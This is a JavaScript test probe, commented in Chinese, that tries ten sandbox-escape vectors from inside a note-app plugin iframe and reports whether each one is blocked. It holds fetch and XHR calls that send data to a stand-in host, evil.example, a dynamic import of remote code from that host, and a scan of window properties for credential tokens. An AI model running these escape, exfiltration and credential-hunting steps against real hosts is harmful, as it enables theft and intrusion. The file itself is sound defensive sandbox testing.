// RFC §14 T0.2 · 沙箱逃逸探针（只给门禁与 PoC 用，不面向用户）。
//
// 本文件把探针源码以字符串形式导出（LEXI_SANDBOX_PROBE_SOURCE）：
//   - 设备 PoC：lexinote_sandbox_poc.html 经 <script src> 拿到字符串，postMessage 进沙箱
//     iframe 求值执行；
//   - 离线门禁：plugin-context-isolation.cjs 在 vm 模拟沙箱环境里求值同一份源码。
// 探针在"插件执行上下文"内部运行，穷举对宿主对象、兄弟插件上下文、存储、网络与
// 凭据的逃逸路径，并输出逐向量结论。任何一条未被阻断都意味着沙箱失败。
'use strict';

function __lexiSandboxEscapeProbe() {
  var root = typeof window !== 'undefined' ? window : globalThis;

  function attempt(id, desc, fn) {
    var blocked = false;
    var detail = '';
    try {
      detail = String(fn() || 'reachable');
      blocked = false;
    } catch (err) {
      blocked = true;
      detail = 'blocked: ' + String((err && err.message) || err).slice(0, 180);
    }
    return { id: id, desc: desc, blocked: blocked, detail: detail.slice(0, 200) };
  }

  function attemptAsync(id, desc, fn) {
    return Promise.resolve().then(fn).then(function (value) {
      return { id: id, desc: desc, blocked: false, detail: String(value || 'reachable').slice(0, 200) };
    }, function (err) {
      return { id: id, desc: desc, blocked: true, detail: ('blocked: ' + String((err && err.message) || err)).slice(0, 200) };
    });
  }

  var vectors = [];
  var credentialHits = 0;

  // V1 父页面 DOM
  vectors.push(attempt('parent-dom', '读取 window.parent.document', function () {
    var title = window.parent.document.title;
    return '父页面 DOM 可读: title=' + title;
  }));

  // V2 父页面宿主全局对象
  vectors.push(attempt('parent-globals', '读取 window.parent.window.LexiObsidian 宿主入口', function () {
    var api = window.parent.window.LexiObsidian;
    if (!api) { throw new Error('宿主入口不存在'); }
    return '宿主全局对象可达: ' + (api.apiVersion || '(no version)');
  }));

  // V3 兄弟插件上下文
  vectors.push(attempt('sibling-iframe', '经 window.parent.frames[0] 触达兄弟插件上下文', function () {
    var frames = window.parent && window.parent.frames;
    var sibling = frames && frames.length > 0 ? frames[0] : null;
    if (!sibling) { throw new Error('无兄弟句柄'); }
    var doc = sibling.document;
    return '兄弟上下文 DOM 可读: ' + ((doc && doc.title) || '(title)');
  }));

  // V4 opener
  vectors.push(attempt('window-opener', '读取 window.opener', function () {
    var opener = window.opener;
    if (!opener) { throw new Error('opener 为 null'); }
    return 'opener 可达';
  }));

  // V5 opaque origin 存储（localStorage + cookie）
  vectors.push(attempt('opaque-storage', '读取 localStorage / document.cookie', function () {
    var stored = null;
    var storageBlocked = false;
    try {
      stored = window.localStorage.getItem('__probe__');
    } catch (err) {
      storageBlocked = true;
    }
    var cookie = '';
    var cookieBlocked = false;
    try {
      cookie = window.document.cookie;
    } catch (err2) {
      cookieBlocked = true;
    }
    if (!storageBlocked && stored !== null) { return 'localStorage 可读: ' + stored; }
    if (!cookieBlocked && cookie.length > 0) { return 'cookie 可读: ' + cookie.slice(0, 60); }
    if (storageBlocked && cookieBlocked) { throw new Error('localStorage 与 cookie 均被拒绝'); }
    if (!storageBlocked && stored === null) { throw new Error('localStorage 返回空（无宿主数据可读）'); }
    throw new Error('cookie 为空（opaque origin 无宿主 cookie）');
  }));

  // V6 fetch 出网
  vectors.push(attemptAsync('network-fetch', 'fetch(https) 外发', function () {
    if (typeof window.fetch !== 'function') { throw new Error('fetch 不可用'); }
    return window.fetch('https://evil.example/collect', { method: 'POST', body: 'probe' })
      .then(function (response) {
        return response.text().then(function (text) {
          return 'fetch 放行: ' + String(text).slice(0, 60);
        });
      });
  }));

  // V7 XHR 出网
  vectors.push(attemptAsync('network-xhr', 'XMLHttpRequest 外发', function () {
    return new Promise(function (resolve, reject) {
      var xhr = new window.XMLHttpRequest();
      xhr.open('GET', 'https://evil.example/collect');
      xhr.onload = function () { resolve('XHR 放行: status=' + xhr.status); };
      xhr.onerror = function () { reject(new Error('XHR 被拒绝(NetworkError)')); };
      try {
        xhr.send();
      } catch (err) {
        reject(err);
      }
    });
  }));

  // V8 远程模块导入
  vectors.push(attemptAsync('remote-import', '动态 import(https) 远程脚本', function () {
    var dynamicImport = new Function('u', 'return import(u)');
    return dynamicImport('https://evil.example/x.js').then(function () {
      return '远程模块加载成功';
    });
  }));

  // V9 new Function 逃逸
  vectors.push(attempt('function-escape', 'new Function 返回 window.parent.document', function () {
    var doc = new Function('return window.parent.document')();
    return 'Function 逃逸拿到父文档: ' + ((doc && doc.title) || '(title)');
  }));

  // V10 凭据扫描：window 自有属性里找 st-/tk- 前缀字符串
  vectors.push(attempt('credential-hunt', '扫描 window 寻找身份凭据字符串', function () {
    var hits = [];
    var names = Object.getOwnPropertyNames(window);
    for (var i = 0; i < names.length; i++) {
      var value = null;
      try { value = window[names[i]]; } catch (err) { continue; }
      if (typeof value === 'string' && /^(st|tk)-[0-9a-f]{16,}/.test(value)) { hits.push(names[i]); }
    }
    if (hits.length > 0) { return '发现疑似凭据: ' + hits.join(','); }
    throw new Error('无凭据字符串暴露');
  }));
  try {
    var names = Object.getOwnPropertyNames(window);
    for (var i = 0; i < names.length; i++) {
      var value = null;
      try { value = window[names[i]]; } catch (err) { continue; }
      if (typeof value === 'string' && /^(st|tk)-[0-9a-f]{16,}/.test(value)) { credentialHits++; }
    }
  } catch (err) { /* 扫描失败按 0 处理 */ }

  return Promise.all(vectors).then(function (settled) {
    // vectors 顺序即报告顺序：同步 attempt 直接是对象，异步 attemptAsync 由 Promise.all 解包。
    var report = {
      vectors: settled,
      total: settled.length,
      blockedCount: settled.filter(function (v) { return v.blocked; }).length,
      credentialHits: credentialHits,
      passed: settled.every(function (v) { return v.blocked; }) && credentialHits === 0
    };
    root.__lexiProbeReport = report;
    return report;
  });
}

var __lexiProbeRoot = typeof window !== 'undefined' ? window : globalThis;
__lexiProbeRoot.LEXI_SANDBOX_PROBE_SOURCE =
  __lexiSandboxEscapeProbe.toString() + '\n__lexiSandboxEscapeProbe();\n';
